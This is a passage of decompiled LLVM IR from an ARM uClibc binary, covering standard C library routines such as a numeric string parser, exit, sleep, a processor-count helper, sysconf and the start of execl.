  %v1_1767c = inttoptr i32 %v0_17690 to i8*
  %v2_1767c = load i8, i8* %v1_1767c, align 1
  %v7_17680 = icmp eq i8 %v2_1767c, 48
  %v1_17684 = add i32 %v0_1761c, 10
  store i32 %v1_17684, i32* %r5.global-to-local, align 4
  br i1 %v7_17680, label %dec_label_pc_17690, label %bb59

bb59:                                             ; preds = %dec_label_pc_1767c
  br label %.thread8

dec_label_pc_17690:                               ; preds = %dec_label_pc_1767c
  %v1_17690 = add i32 %v0_17690, 1
  %v2_17690 = inttoptr i32 %v1_17690 to i8*
  %v3_17690 = load i8, i8* %v2_17690, align 1
  %v4_17690 = zext i8 %v3_17690 to i32
  store i32 %v1_17690, i32* %r4.global-to-local, align 4
  %v1_17694 = or i32 %v4_17690, 32
  %v7_17698 = icmp eq i32 %v1_17694, 120
  %v1_1769c = add i32 %v0_1761c, 8
  store i32 %v1_1769c, i32* %r5.global-to-local, align 4
  br i1 %v7_17698, label %bb60, label %.thread8

bb60:                                             ; preds = %dec_label_pc_17690
  %v3_176a8 = mul i32 %v1_1769c, 2
  store i32 %v3_176a8, i32* %r5.global-to-local, align 4
  %v2_176ac = add i32 %v0_17690, 2
  store i32 %v2_176ac, i32* %r4.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_17690, %bb59, %bb60
  %v1_1777829 = phi i32 [ %v0_17620, %bb59 ], [ %v1_17690, %bb60 ], [ %v1_17690, %dec_label_pc_17690 ]
  %v0_176fc20 = phi i32 [ %v0_17690, %bb59 ], [ %v2_176ac, %bb60 ], [ %v1_17690, %dec_label_pc_17690 ]
  %v0_176b0 = phi i32 [ %v1_17684, %bb59 ], [ %v3_176a8, %bb60 ], [ %v1_1769c, %dec_label_pc_17690 ]
  %v5_176b4 = icmp slt i32 %v0_176b0, 16
  br i1 %v5_176b4, label %bb62, label %bb61

bb61:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb62

bb62:                                             ; preds = %bb58, %.thread8, %bb61
  %v1_1777828 = phi i32 [ %v0_17620, %bb58 ], [ %v1_1777829, %.thread8 ], [ %v1_1777829, %bb61 ]
  %v0_176fc19 = phi i32 [ %v0_17690, %bb58 ], [ %v0_176fc20, %.thread8 ], [ %v0_176fc20, %bb61 ]
  %v0_176c8 = phi i32 [ %v0_1761c, %bb58 ], [ %v0_176b0, %.thread8 ], [ 16, %bb61 ]
  %v1_176b8 = add i32 %v0_176c8, -2
  %tmp = icmp ugt i32 %v1_176b8, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_176c8

.thread:                                          ; preds = %bb62
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_17774

dec_label_pc_176c8:                               ; preds = %bb62
  %v2_176d0 = urem i32 -1, %v0_176c8
  %v1_176e0 = urem i32 %v2_176d0, 256
  store i32 %v1_176e0, i32* %sl.global-to-local, align 4
  %v2_176e4 = udiv i32 -1, %v0_176c8
  store i32 -1, i32* %sb.global-to-local, align 4
  store i32 %v2_176e4, i32* %r8.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_176fc

dec_label_pc_176f8:                               ; preds = %bb69, %dec_label_pc_17758
  %v0_176f8 = phi i32 [ %v1_1773843, %bb69 ], [ %v0_176f8.pre, %dec_label_pc_17758 ]
  br label %dec_label_pc_176fc

dec_label_pc_176fc:                               ; preds = %dec_label_pc_176c8, %dec_label_pc_176f8
  %v1_1777826 = phi i32 [ %v1_1777828, %dec_label_pc_176c8 ], [ %v0_176f8, %dec_label_pc_176f8 ]
  %v0_17738 = phi i32 [ %v0_176fc19, %dec_label_pc_176c8 ], [ %v0_176f8, %dec_label_pc_176f8 ]
  %v1_176fc = inttoptr i32 %v0_17738 to i8*
  %v2_176fc = load i8, i8* %v1_176fc, align 1
  %v3_176fc = zext i8 %v2_176fc to i32
  %v1_17700 = add nsw i32 %v3_176fc, -48
  %v1_17704 = urem i32 %v1_17700, 256
  %v1_1770c = or i32 %v3_176fc, 32
  %tmp77 = icmp ult i32 %v1_17704, 10
  br i1 %tmp77, label %bb64, label %dec_label_pc_17714

dec_label_pc_17714:                               ; preds = %dec_label_pc_176fc
  %tmp78 = icmp ugt i32 %v1_1770c, 96
  br i1 %tmp78, label %bb63, label %bb64

bb63:                                             ; preds = %dec_label_pc_17714
  %v1_17718 = add nsw i32 %v1_1770c, -87
  %v5_17720 = urem i32 %v1_17718, 256
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_176fc, %dec_label_pc_17714, %bb63
  %v3_17750 = phi i32 [ %v1_17704, %dec_label_pc_176fc ], [ 40, %dec_label_pc_17714 ], [ %v5_17720, %bb63 ]
  %v1_17724 = load i32, i32* %r5.global-to-local, align 4
  %v6_17728 = icmp slt i32 %v3_17750, %v1_17724
  br i1 %v6_17728, label %dec_label_pc_1772c, label %dec_label_pc_17774.loopexit

dec_label_pc_1772c:                               ; preds = %bb64
  %v0_1772c = load i32, i32* %ip.global-to-local, align 4
  %v1_1772c = load i32, i32* %r8.global-to-local, align 4
  %v9_1772c = icmp eq i32 %v0_1772c, %v1_1772c
  br i1 %v9_1772c, label %.thread38, label %bb65

.thread38:                                        ; preds = %dec_label_pc_1772c
  %v1_1773839 = add i32 %v0_17738, 1
  store i32 %v1_1773839, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17740

bb65:                                             ; preds = %dec_label_pc_1772c
  %v3_1772c = icmp ult i32 %v0_1772c, %v1_1772c
  %v1_17738 = add i32 %v0_17738, 1
  store i32 %v1_17738, i32* %r4.global-to-local, align 4
  br i1 %v3_1772c, label %dec_label_pc_17740, label %dec_label_pc_17758

dec_label_pc_17740:                               ; preds = %bb65, %.thread38
  %v1_1773843 = phi i32 [ %v1_1773839, %.thread38 ], [ %v1_17738, %bb65 ]
  %v4_177482342 = phi i32 [ 1, %.thread38 ], [ 0, %bb65 ]
  %v1_17740 = load i32, i32* %sl.global-to-local, align 4
  %v3_17740 = icmp uge i32 %v3_17750, %v1_17740
  %v9_17740 = icmp eq i32 %v3_17750, %v1_17740
  %v2_17744 = xor i1 %v3_17740, true
  %v3_17744 = or i1 %v9_17740, %v2_17744
  br i1 %v3_17744, label %bb66, label %bb67

bb66:                                             ; preds = %dec_label_pc_17740
  br label %bb67

bb67:                                             ; preds = %dec_label_pc_17740, %bb66
  %v4_17748 = phi i32 [ %v4_177482342, %dec_label_pc_17740 ], [ 0, %bb66 ]
  %v2_17748 = xor i1 %v9_17740, true
  %v3_17748 = and i1 %v3_17740, %v2_17748
  br i1 %v3_17748, label %bb68, label %thread-pre-split

bb68:                                             ; preds = %bb67
  %v5_17748 = urem i32 %v4_17748, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb67, %bb68
  %v0_1774c = phi i32 [ %v5_17748, %bb68 ], [ %v4_17748, %bb67 ]
  %v2_1774c = icmp eq i32 %v0_1774c, 0
  br i1 %v2_1774c, label %bb69, label %dec_label_pc_17758

bb69:                                             ; preds = %thread-pre-split
  %v4_17750 = mul i32 %v0_1772c, %v1_17724
  %v5_17750 = add i32 %v4_17750, %v3_17750
  store i32 %v5_17750, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_176f8

dec_label_pc_17758:                               ; preds = %bb65, %thread-pre-split
  %v0_17758 = call i32 @__GI___errno_location()
  %v2_1775c = load i32, i32* %stack_var_-40, align 4
  %v0_17760 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_17760, i32* %ip.global-to-local, align 4
  %v0_17764 = load i32, i32* %r7.global-to-local, align 4
  %v2_17764 = and i32 %v0_17764, %v2_1775c
  store i32 %v2_17764, i32* %r7.global-to-local, align 4
  %v2_1776c = inttoptr i32 %v0_17758 to i32*
  store i32 34, i32* %v2_1776c, align 4
  %v0_176f8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_176f8

dec_label_pc_17774.loopexit:                      ; preds = %bb64
  %v0_17774.pre = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_17774

dec_label_pc_17774:                               ; preds = %.thread, %dec_label_pc_17774.loopexit
  %v1_17778 = phi i32 [ %v1_1777826, %dec_label_pc_17774.loopexit ], [ %v1_1777828, %.thread ]
  %v2_17778 = phi i32 [ %v0_17774.pre, %dec_label_pc_17774.loopexit ], [ %v0_17618, %.thread ]
  %v2_17774 = icmp eq i32 %v2_17778, 0
  br i1 %v2_17774, label %bb71, label %bb70

bb70:                                             ; preds = %dec_label_pc_17774
  %v3_17778 = inttoptr i32 %v2_17778 to i32*
  store i32 %v1_17778, i32* %v3_17778, align 4
  br label %bb71

bb71:                                             ; preds = %dec_label_pc_17774, %bb70
  %v2_1777c = load i32, i32* %stack_var_-40, align 4
  %v0_17780 = load i32, i32* %r7.global-to-local, align 4
  %v2_17780 = icmp eq i32 %v0_17780, 0
  %. = select i1 %v2_17780, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r4.global-to-local, align 4
  %v2_1778c = icmp eq i32 %v2_1777c, 0
  %v0_177b0.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br i1 %v2_1778c, label %dec_label_pc_177a8, label %bb74

bb74:                                             ; preds = %bb71
  %tmp79 = icmp ugt i32 %v0_177b0.pre.pre, %.
  br i1 %tmp79, label %dec_label_pc_17798, label %dec_label_pc_177a8

dec_label_pc_17798:                               ; preds = %bb74
  %v0_17798 = call i32 @__GI___errno_location()
  %v2_177a0 = inttoptr i32 %v0_17798 to i32*
  store i32 34, i32* %v2_177a0, align 4
  %v0_177a4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_177a4, i32* %ip.global-to-local, align 4
  %v0_177a8.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_177a8

dec_label_pc_177a8:                               ; preds = %bb74, %bb71, %dec_label_pc_17798
  %v0_177b0.pre = phi i32 [ %v0_177b0.pre.pre, %bb74 ], [ %v0_177a4, %dec_label_pc_17798 ], [ %v0_177b0.pre.pre, %bb71 ]
  %v0_177a8 = phi i32 [ %v0_17780, %bb74 ], [ %v0_177a8.pre, %dec_label_pc_17798 ], [ %v0_17780, %bb71 ]
  %v2_177a8 = icmp eq i32 %v0_177a8, 0
  br i1 %v2_177a8, label %dec_label_pc_177a8._crit_edge, label %bb75

bb75:                                             ; preds = %dec_label_pc_177a8
  %v2_177ac = sub i32 0, %v0_177b0.pre
  store i32 %v2_177ac, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_177a8._crit_edge

dec_label_pc_177a8._crit_edge:                    ; preds = %dec_label_pc_177a8, %bb75
  %v0_177b0 = phi i32 [ %v2_177ac, %bb75 ], [ %v0_177b0.pre, %dec_label_pc_177a8 ]
  ret i32 %v0_177b0

; uselistorder directives
  uselistorder i32 %v0_177b0.pre, { 1, 0 }
  uselistorder i32 %v0_177b0.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_17748, { 1, 0 }
  uselistorder i1 %v3_17740, { 1, 0 }
  uselistorder i32 %v1_17740, { 1, 0 }
  uselistorder i32 %v1_1770c, { 1, 0 }
  uselistorder i32 %v1_17704, { 1, 0 }
  uselistorder i32 %v0_17738, { 1, 0, 2 }
  uselistorder i32 %v0_176f8, { 1, 0 }
  uselistorder i32 %v0_176c8, { 1, 0, 2 }
  uselistorder i32 %v3_176a8, { 1, 0 }
  uselistorder i32 %v1_1769c, { 1, 0, 2 }
  uselistorder i32 %v0_17690, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_1766c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_17620, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1761c, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 7, 8 }
  uselistorder label %dec_label_pc_177a8._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_177a8, { 2, 0, 1 }
  uselistorder label %bb71, { 1, 0 }
  uselistorder label %dec_label_pc_17774, { 1, 0 }
  uselistorder label %dec_label_pc_17758, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb67, { 1, 0 }
  uselistorder label %bb64, { 2, 1, 0 }
  uselistorder label %dec_label_pc_176fc, { 1, 0 }
  uselistorder label %dec_label_pc_176f8, { 1, 0 }
  uselistorder label %bb62, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17670, { 1, 0 }
  uselistorder label %dec_label_pc_1766c, { 1, 0 }
  uselistorder label %dec_label_pc_17630, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_177c0 = ptrtoint i32* %stack_var_-16 to i32
  store i32 ptrtoint (i8* @global_var_18078.1329 to i32), i32* @r1, align 4
  store i32 ptrtoint (i32* @global_var_2e40c.1505 to i32), i32* @r2, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v2_177c0, i32* @r0, align 4
  %v1_177dc = call i32 @_pthread_cleanup_push_defer()
  %v2_177ec = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_2e40c.1505 to i32))
  %v2_177f4 = load i32, i32* @global_var_34670.1509, align 4
  %v2_177f8 = icmp eq i32 %v2_177f4, 0
  br i1 %v2_177f8, label %.thread1, label %bb

bb:                                               ; preds = %entry
  call void @__pseudo_branch(i32 %v2_177f4)
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  store i32 %v2_177c0, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  %v1_17818 = call i32 @_pthread_cleanup_pop_restore()
  store i32 %v1_17818, i32* @r0, align 4
  %v1_1781c = call i32 @__GI___uClibc_fini(i32 %v1_17818)
  store i32 96304, i32* @lr, align 4
  %v2_1782c = call i32 @_stdio_term()
  %v0_17830 = load i32, i32* @r4, align 4
  %v1_17834 = call i32 @__GI__exit(i32 %v0_17830)
  unreachable

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_17854 = load i32, i32* @r4, align 4
  %v2_17858 = icmp eq i32 %arg1, 0
  store i32 0, i32* @r4, align 4
  br i1 %v2_17858, label %dec_label_pc_178ec, label %dec_label_pc_17868

dec_label_pc_17868:                               ; preds = %entry
  %v2_1785c = ptrtoint i32* %stack_var_-44 to i32
  store i32 65536, i32* %stack_var_-24, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v3_1788c = call i32 @__libc_sigaction(i32 17, i32 0, i32 %v2_1785c)
  %v2_17890 = load i32, i32* %stack_var_-44, align 4
  %v7_17894 = icmp eq i32 %v2_17890, 1
  br i1 %v7_17894, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_17868
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_17868, %bb
  call void @__pseudo_cond_branch(i1 %v7_17894, i32 ptrtoint (i32* @global_var_142b0.1513 to i32))
  %v2_178a8 = ptrtoint i32* %stack_var_-16 to i32
  %v2_178b0 = bitcast i32* %stack_var_-16 to %timespec*
  %v3_178b0 = call i32 @__libc_nanosleep(%timespec* %v2_178b0, i32 %v2_178a8)
  %v2_178b4 = icmp eq i32 %v3_178b0, 0
  br i1 %v2_178b4, label %bb18, label %bb17

bb17:                                             ; preds = %.thread2
  %v3_178c8 = load i32, i32* %stack_var_-16, align 4
  br label %bb18

bb18:                                             ; preds = %.thread2, %bb17
  %storemerge = phi i32 [ %v3_178c8, %bb17 ], [ 0, %.thread2 ]
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v3_178d8 = load i32, i32* %stack_var_-24, align 4
  %v1_178dc = and i32 %v3_178d8, 65536
  %v2_178dc = icmp eq i32 %v1_178dc, 0
  br i1 %v2_178dc, label %bb19, label %.thread6

bb19:                                             ; preds = %bb18
  br label %.thread6

.thread6:                                         ; preds = %bb18, %bb19
  store i32 96492, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_178dc, i32 ptrtoint (i32* @global_var_142b0.1513 to i32))
  %v0_178ec.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_178ec

dec_label_pc_178ec:                               ; preds = %entry, %.thread6
  %v0_178ec = phi i32 [ %v0_178ec.pre, %.thread6 ], [ 0, %entry ]
  store i32 %v3_17854, i32* @r4, align 4
  ret i32 %v0_178ec

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0, 3, 2 }
  uselistorder i32 (i32, i32, i32)* @__libc_sigaction, { 1, 0, 2 }
  uselistorder label %dec_label_pc_178ec, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @nprocessors_onln() local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_17904 = ptrtoint i32* %stack_var_-24 to i32
  store i32 0, i32* @r4, align 4
  store i32 0, i32* %stack_var_-24, align 4
  %v2_17910 = call i32 @__GI_config_open(i32 ptrtoint ([11 x i8]* @global_var_25358.1516 to i32))
  store i32 %v2_17910, i32* @r5, align 4
  %v2_17914 = icmp eq i32 %v2_17910, 0
  br i1 %v2_17914, label %dec_label_pc_17990, label %.preheader6

.preheader6:                                      ; preds = %entry
  store i32 ptrtoint (i32* @global_var_2e1e4 to i32), i32* @r7, align 4
  store i32 %v2_17904, i32* @r6, align 4
  br label %bb18

dec_label_pc_17928:                               ; preds = %bb18
  %v2_17928 = load i32, i32* %stack_var_-24, align 4
  %v1_1792c = inttoptr i32 %v2_17928 to i32*
  %v2_1792c = load i32, i32* %v1_1792c, align 4
  %v1_17930 = inttoptr i32 %v2_1792c to i8*
  %v2_17930 = load i8, i8* %v1_17930, align 1
  %v7_17934 = icmp eq i8 %v2_17930, 99
  br i1 %v7_17934, label %dec_label_pc_1793c, label %.backedge8

dec_label_pc_1793c:                               ; preds = %dec_label_pc_17928
  %v1_1793c = add i32 %v2_1792c, 1
  %v2_1793c = inttoptr i32 %v1_1793c to i8*
  %v3_1793c = load i8, i8* %v2_1793c, align 1
  %v7_17940 = icmp eq i8 %v3_1793c, 112
  br i1 %v7_17940, label %dec_label_pc_17948, label %.backedge8

dec_label_pc_17948:                               ; preds = %dec_label_pc_1793c
  %v1_17948 = add i32 %v2_1792c, 2
  %v2_17948 = inttoptr i32 %v1_17948 to i8*
  %v3_17948 = load i8, i8* %v2_17948, align 1
  %v7_1794c = icmp eq i8 %v3_17948, 117
  br i1 %v7_1794c, label %dec_label_pc_17954, label %.backedge8

dec_label_pc_17954:                               ; preds = %dec_label_pc_17948
  %v1_17954 = add i32 %v2_1792c, 3
  %v2_17954 = inttoptr i32 %v1_17954 to i8*
  %v3_17954 = load i8, i8* %v2_17954, align 1
  %v4_17954 = zext i8 %v3_17954 to i32
  %v2_17958 = load i32, i32* @global_var_2e1e4, align 4
  %v2_1795c = mul nuw nsw i32 %v4_17954, 2
  %v2_17960 = add i32 %v2_1795c, %v2_17958
  %v1_17964 = add i32 %v2_17960, 1
  %v2_17964 = inttoptr i32 %v1_17964 to i8*
  %v3_17964 = load i8, i8* %v2_17964, align 1
  %v1_17968 = and i8 %v3_17964, 8
  %v2_17968 = icmp eq i8 %v1_17968, 0
  br i1 %v2_17968, label %.backedge8, label %bb

bb:                                               ; preds = %dec_label_pc_17954
  %v1_1796c = load i32, i32* @r4, align 4
  %v2_1796c = add i32 %v1_1796c, 1
  store i32 %v2_1796c, i32* @r4, align 4
  br label %.backedge8

.backedge8:                                       ; preds = %bb, %dec_label_pc_17954, %dec_label_pc_17928, %dec_label_pc_1793c, %dec_label_pc_17948
  %v0_17970.pre = load i32, i32* @r5, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge8, %.preheader6
  %v0_17970 = phi i32 [ %v0_17970.pre, %.backedge8 ], [ %v2_17910, %.preheader6 ]
  %v4_17980 = inttoptr i32 %v0_17970 to i32*
  %v5_17980 = call i32 @__GI_config_read(i32* %v4_17980, i32 %v2_17904, i32 258, i32 ptrtoint (i32* @global_var_25364.1520 to i32))
  %v2_17984 = icmp eq i32 %v5_17980, 0
  br i1 %v2_17984, label %dec_label_pc_179e0, label %dec_label_pc_17928

dec_label_pc_17990:                               ; preds = %entry
  %v2_17994 = call i32 @__GI_config_open(i32 ptrtoint ([14 x i8]* @global_var_25368.1522 to i32))
  store i32 %v2_17994, i32* @r5, align 4
  %v2_17998 = icmp eq i32 %v2_17994, 0
  br i1 %v2_17998, label %bb19, label %.preheader

bb19:                                             ; preds = %dec_label_pc_17990
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_179e0

.preheader:                                       ; preds = %dec_label_pc_17990
  store i32 %v2_17904, i32* @r6, align 4
  br label %bb21

dec_label_pc_179ac:                               ; preds = %bb21
  %v2_179ac = load i32, i32* %stack_var_-24, align 4
  %v1_179b0 = inttoptr i32 %v2_179ac to i32*
  %v2_179b0 = load i32, i32* %v1_179b0, align 4
  store i32 %v2_179b0, i32* @r1, align 4
  %v4_179b4 = call i32 @__GI_strcoll(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_25378.1527, i32 0, i32 0), i32 %v2_179b0)
  %v2_179b8 = icmp eq i32 %v4_179b4, 0
  br i1 %v2_179b8, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_179ac
  %v1_179bc = load i32, i32* @r4, align 4
  %v2_179bc = add i32 %v1_179bc, 1
  store i32 %v2_179bc, i32* @r4, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_179ac
  %v0_179cc.pre = load i32, i32* @r5, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %.preheader
  %v0_179cc = phi i32 [ %v0_179cc.pre, %.backedge ], [ %v2_17994, %.preheader ]
  %v4_179d0 = inttoptr i32 %v0_179cc to i32*
  %v5_179d0 = call i32 @__GI_config_read(i32* %v4_179d0, i32 %v2_17904, i32 459266, i32 ptrtoint (i32* @global_var_2539c.1525 to i32))
  %v2_179d4 = icmp eq i32 %v5_179d0, 0
  br i1 %v2_179d4, label %dec_label_pc_179e0, label %dec_label_pc_179ac

dec_label_pc_179e0:                               ; preds = %bb18, %bb21, %bb19
  %v0_179e0 = load i32, i32* @r5, align 4
  %v1_179e4 = inttoptr i32 %v0_179e0 to i32*
  %v2_179e4 = call i32 @__GI_config_close(i32* %v1_179e4)
  %v0_179e8 = load i32, i32* @r4, align 4
  %v2_179e8 = icmp eq i32 %v0_179e8, 0
  %.v0_179e8 = select i1 %v2_179e8, i32 1, i32 %v0_179e8
  ret i32 %.v0_179e8

; uselistorder directives
  uselistorder i32 %v2_17904, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_179e0, { 1, 2, 0 }
  uselistorder label %.backedge8, { 0, 1, 4, 3, 2 }
}

define i32 @sysconf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_17a1c = load i32, i32* @r4, align 4
  store i32 %v3_17a1c, i32* %stack_var_-24, align 4
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_17df8

bb:                                               ; preds = %entry
  %v7_17a24 = mul i32 %arg1, 4
  %v8_17a24 = add i32 %v7_17a24, ptrtoint (i32* @global_var_17a2c.1528 to i32)
  %v9_17a24 = inttoptr i32 %v8_17a24 to i32*
  %v10_17a24 = load i32, i32* %v9_17a24, align 4
  call void @__pseudo_branch(i32 %v10_17a24)
  br label %dec_label_pc_17df8

dec_label_pc_17df8:                               ; preds = %bb, %entry
  %v0_17df8 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_17e04 = inttoptr i32 %v0_17df8 to i32*
  store i32 22, i32* %v2_17e04, align 4
  %v0_17fbc = load i32, i32* %r2.global-to-local, align 4
  %v2_17fc0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_17fc0, i32* @r4, align 4
  ret i32 %v0_17fbc

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_17fc8(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_17fc8:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_17fc8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17fc8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_17fc8
  %v3_17fc8 = udiv i32 %arg2, 256
  %v4_17fc8 = mul i32 %arg2, 16777216
  %v5_17fc8 = or i32 %v3_17fc8, %v4_17fc8
  %v8_17fc8 = and i32 %v5_17fc8, %tmp
  store i32 %v8_17fc8, i32* %r0.global-to-local, align 4
  %v2_17fcc = load i32, i32* @r5, align 4
  %v4_17fcc = lshr i32 %v2_17fcc, %v8_17fc8
  %v5_17fcc = sub i32 32, %v8_17fc8
  %v6_17fcc = shl i32 %v2_17fcc, %v5_17fcc
  %v7_17fcc = or i32 %v6_17fcc, %v4_17fcc
  %v9_17fcc = and i32 %v7_17fcc, %v8_17fc8
  %v4_17fe0 = inttoptr i32 %v8_17fc8 to i32*
  store i32 %v9_17fcc, i32* %v4_17fe0, align 4
  %v5_17fe0 = load i32, i32* %r0.global-to-local, align 4
  %v6_17fe0 = add i32 %v5_17fe0, -98280
  store i32 %v6_17fe0, i32* %r0.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_17fc8, %bb
  %v7_17fe0 = phi i32 [ %tmp, %dec_label_pc_17fc8 ], [ %v6_17fe0, %bb ]
  ret i32 %v7_17fe0

; uselistorder directives
  uselistorder i32 %v8_17fc8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_17fe4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_17fe4, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_17ff4 = ptrtoint i32* %stack_var_-32 to i32
  %v2_17ff8 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_17ff8, i32* %stack_var_-32, align 4
  br label %dec_label_pc_18004

dec_label_pc_18004:                               ; preds = %dec_label_pc_18004, %entry
  %v0_18018 = phi i32 [ %v1_18018, %dec_label_pc_18004 ], [ 0, %entry ]
  %v3_18004 = phi i32 [ %v1_1800c, %dec_label_pc_18004 ], [ %v2_17ff8, %entry ]
  %v1_18008 = inttoptr i32 %v3_18004 to i32*
  %v2_18008 = load i32, i32* %v1_18008, align 4
  %v1_1800c = add i32 %v3_18004, 4
  %v2_18010 = icmp eq i32 %v2_18008, 0
  store i32 %v1_1800c, i32* %stack_var_-32, align 4
  %v1_18018 = add i32 %v0_18018, 1
  store i32 %v1_18018, i32* @lr, align 4
  br i1 %v2_18010, label %dec_label_pc_18020, label %dec_label_pc_18004

dec_label_pc_18020:                               ; preds = %dec_label_pc_18004
  %v3_18020.neg = mul i32 %v1_18018, -4
  %v1_18024.neg = add i32 %v2_17ff4, -8
  %v2_18028 = add i32 %v1_18024.neg, %v3_18020.neg
  %v2_18030 = inttoptr i32 %v2_18028 to i32*
  store i32 %arg1, i32* %v2_18030, align 4
  store i32 %v2_17ff8, i32* %stack_var_-32, align 4
  %v0_1803c = load i32, i32* @sp, align 4
  store i32 %v0_1803c, i32* @r1, align 4
  store i32 %v0_1803c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_18044

dec_label_pc_18044:                               ; preds = %dec_label_pc_18044.dec_label_pc_18044_crit_edge, %dec_label_pc_18020
  %v1_18058 = phi i32 [ %v5_18058, %dec_label_pc_18044.dec_label_pc_18044_crit_edge ], [ %v0_1803c, %dec_label_pc_18020 ]
  %v3_18044 = phi i32 [ %v3_18044.pre, %dec_label_pc_18044.dec_label_pc_18044_crit_edge ], [ %v2_17ff8, %dec_label_pc_18020 ]
  %v1_18048 = inttoptr i32 %v3_18044 to i32*
  %v2_18048 = load i32, i32* %v1_18048, align 4
  %v0_1804c = load i32, i32* @lr, align 4
  %v1_1804c = add i32 %v0_1804c, -1
  store i32 %v1_1804c, i32* @lr, align 4
  %v7_1804c = icmp eq i32 %v0_1804c, 1
  %v1_18050 = add i32 %v3_18044, 4
  store i32 %v1_18050, i32* %stack_var_-32, align 4
  %v2_18058 = add i32 %v1_18058, 4
  %v3_18058 = inttoptr i32 %v2_18058 to i32*
  store i32 %v2_18048, i32* %v3_18058, align 4
  %v4_18058 = load i32, i32* %ip.global-to-local, align 4
  %v5_18058 = add i32 %v4_18058, 4
  store i32 %v5_18058, i32* %ip.global-to-local, align 4
  br i1 %v7_1804c, label %dec_label_pc_18060, label %dec_label_pc_18044.dec_label_pc_18044_crit_edge

